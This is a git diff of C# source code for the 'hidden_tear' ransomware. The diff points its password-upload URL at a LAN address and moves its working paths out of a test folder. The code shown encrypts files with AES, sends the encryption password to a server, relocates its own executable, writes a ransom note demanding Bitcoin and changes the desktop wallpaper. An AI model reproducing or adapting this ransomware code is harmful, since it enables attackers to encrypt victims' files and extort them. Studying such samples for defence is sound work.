@@ -51,11 +51,11 @@ namespace hidden_tear
         private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
         //Url to send encryption password and computer info
         //string targetURL = "http://www.example.com/Server/write.php";
-        string targetURL = "http://localhost/hidden-tear/write.php";
+        string targetURL = "http://192.168.100.20/hiddentear/write.php";
         //string userName = Environment.UserName;
         string userName = "cowboxhero";
         string computerName = System.Environment.MachineName.ToString();
-        string userDir = "C:\\Users\\최고의 지식근로자\\Desktop\\";
+        string userDir = "C:\\HiddenTear\\";
         string backgroundImageUrl = "http://i.imgur.com/xZuLWTN.jpg"; //desktop background picture
 
 
@@ -161,7 +161,7 @@ namespace hidden_tear
             byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
 
             //string users = "Users\\";
-            string path_inf = userDir + "\\test\\READ_IT.txt.locked";       //path of the info file
+            string path_inf = userDir + "\\READ_IT.txt.locked";       //path of the info file
             string fullpath_inf = userDir + path_inf;
             if (File.Exists(fullpath_inf))
             {
@@ -206,8 +206,8 @@ namespace hidden_tear
         //create a random dir and move virus on it to avoid conflicts with encryption itself
         public void MoveVirus()
         {
-            string destFileName = userDir + "\\test\\Rand123";
-            string destFileName_2 = userDir  + "\\test\\Rand123\\local.exe";
+            string destFileName = userDir + "\\Rand123";
+            string destFileName_2 = userDir  + "\\Rand123\\local.exe";
             if (!Directory.Exists(destFileName))
             {
                 Directory.CreateDirectory(destFileName);
@@ -252,7 +252,7 @@ namespace hidden_tear
             Directory_Settings_Sending(password);
             messageCreator();
             bool Internet;
-            string backgroundImageName = userDir + "\\test\\ransom.jpg";
+            string backgroundImageName = userDir + "\\ransom.jpg";
             // creating a loop if connection doesn't exist while it is available again to send password and change background desktop
             do
             {
@@ -270,7 +270,7 @@ namespace hidden_tear
         public void Directory_Settings_Sending(string password){
             //path to ecnrypt (child drectories already included)
             //string path_1 = "Users\\test\\";
-            string startPath_0 = userDir + "\\test\\ransomware";
+            string startPath_0 = userDir + "\\ransomware";
             //string startPath_1 = userDir + "\\test\\Desktop";
             //string startPath_2 = userDir + "\\test\\Links";
             //string startPath_3 = userDir + "\\test\\Contacts";
@@ -304,7 +304,7 @@ namespace hidden_tear
         {
             //string path = "\\Desktop\\READ_IT.txt";
             //string fullpath = userDir + "Users\\" + userName + path;
-            string fullpath = "C:\\Users\\최고의 지식근로자\\Desktop\\test\\READ_IT.txt";
+            string fullpath = "C:\\HiddenTear\\READ_IT.txt";
             //string infos = computerName + "-" + userName;
             string[] lines = { "This computer has been hacked","Your personal files have been ecrypted. Send me BTC or food to get decryption passcode.", "After that, you'll be able to see your beloved files again.","With love... Hidden Tear Project :')"};
             System.IO.File.WriteAllLines(fullpath, lines);
